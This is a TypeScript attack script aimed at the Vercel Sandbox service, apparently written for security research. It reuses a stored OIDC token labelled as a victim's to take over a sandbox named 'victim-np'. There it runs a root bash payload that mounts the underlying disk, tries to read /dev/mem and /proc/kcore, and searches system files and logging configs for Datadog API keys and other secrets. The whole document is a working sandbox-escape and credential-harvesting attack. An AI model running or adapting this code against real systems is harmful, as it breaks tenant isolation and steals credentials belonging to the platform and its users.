import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadEnv(file: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const line of readFileSync(file, "utf8").split("\n")) {
    const m = line.match(/^([A-Z_]+)=(.*)$/);
    if (m) out[m[1]] = m[2].trim();
  }
  return out;
}
const VICTIM = loadEnv("/tmp/vercel-sandbox/victima/.env.local").VERCEL_OIDC_TOKEN!;
const V = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString());

const EXPLORE = `#!/bin/bash
set +e
mkdir -p /mnt/vda2
mount -t xfs /dev/vda /mnt/vda2 2>/dev/null
R=/mnt/vda2
echo "=== try /dev/mem ==="
mknod /tmp/mem c 1 1 2>/dev/null
timeout 5 dd if=/tmp/mem bs=1 count=4096 2>&1 | head -c 64 | od -c | head -4
ls -la /proc/kcore 2>&1
echo "=== dd from /proc/kcore ==="
timeout 8 dd if=/proc/kcore bs=4096 count=1 2>&1 | head -c 128 | od -c | head -6
echo "=== scan mounted disk more broadly for secrets ==="
grep -rls "api-key" $R/etc $R/opt $R/var $R/root $R/home 2>/dev/null | head -20
grep -rls "DATADOG_API_KEY" $R/etc $R/opt $R/var 2>/dev/null | head -20
echo "=== find vector process env (via proc from host netns impossible, try /run) ==="
ls -la $R/run/ 2>&1 | head -40
echo "=== look for vector/systemd units ==="
ls -la $R/etc/systemd/system/ 2>/dev/null | head -30
cat $R/etc/systemd/system/*vector* 2>/dev/null | head -30
echo "=== search /run /var/lib /tmp for json/toml/env with secrets ==="
find $R/run $R/var/lib $R/tmp -type f -size -2M 2>/dev/null | head -40
echo "=== grep those for datadog key patterns ==="
for f in $(find $R/run $R/var/lib $R/tmp -type f -size -2M 2>/dev/null); do
  strings -a "$f" 2>/dev/null | grep -laiE "datadog|api-key" >/dev/null 2>&1 && echo "HIT: $f"
done | head -20
echo "=== vector configs full content ==="
cat $R/etc/vector/sinks/datadog_celld.toml 2>/dev/null
echo "---"
cat $R/etc/vector/sinks/datadog_kernel.toml 2>/dev/null
echo DONE`;

const SCRIPT = `set +e
cat > /tmp/explore23.sh <<'EXPLORE_EOF'
${EXPLORE}
EXPLORE_EOF
sudo unshare -m --propagation private bash /tmp/explore23.sh 2>&1
echo "=== rc: $? ==="
`;

async function main() {
  const sbx = await Sandbox.get({ name: "victim-np", token: VICTIM, teamId: V.owner_id, projectId: V.project_id });
  const res = await sbx.runCommand("bash", ["-c", SCRIPT], { sudo: true, wait: true, timeout: 90_000 });
  console.log("exit:", res.exitCode);
  console.log(await res.output("both"));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });